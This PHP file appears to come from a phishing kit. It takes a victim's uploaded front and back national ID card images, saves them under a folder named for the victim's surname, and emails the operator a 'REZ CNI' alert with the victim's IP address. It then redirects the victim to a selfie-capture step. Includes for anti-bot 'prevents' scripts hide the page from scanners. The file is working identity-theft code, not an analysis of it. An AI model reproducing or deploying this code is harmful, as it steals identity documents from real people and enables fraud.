<?php

error_reporting(0);
ob_start();
session_start();

include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../monsterab/ab.php';
include '../../algorythm/mail.php';
$name = $_SESSION['last_name'];
if ($_SERVER['REQUEST_METHOD'] === 'POST'){


//Condition si les valeurs ne sont pas remplies
if(empty($_FILES['recto']))
{
header('Location: index.php');
}
else{
$msg = "

# tuiix Cni

";
mkdir("../../packid/$name/", 0777);	
$dossier = "../../packid/$name/";
$fichier = basename($_FILES['recto']['name']);
move_uploaded_file($_FILES['recto']['tmp_name'], $dossier . $fichier);
$fichier2 = basename($_FILES['verso']['name']);
move_uploaded_file($_FILES['verso']['tmp_name'], $dossier . $fichier2);
	
$subject = "「🆔」REZ CNI | ". $_SESSION['ip'] . " " ;
$fromsender = "From: ©️ ｔｕｉｉｘ ©️ <tuiix.tuiix@protonmail.com>";
	mail($rezmail,$subject,$msg,$fromsender);

$_SESSION['cni'] = true;
header('Location: ../selfie/');
}
}
else{

header('Location: ../../login/');
}
?>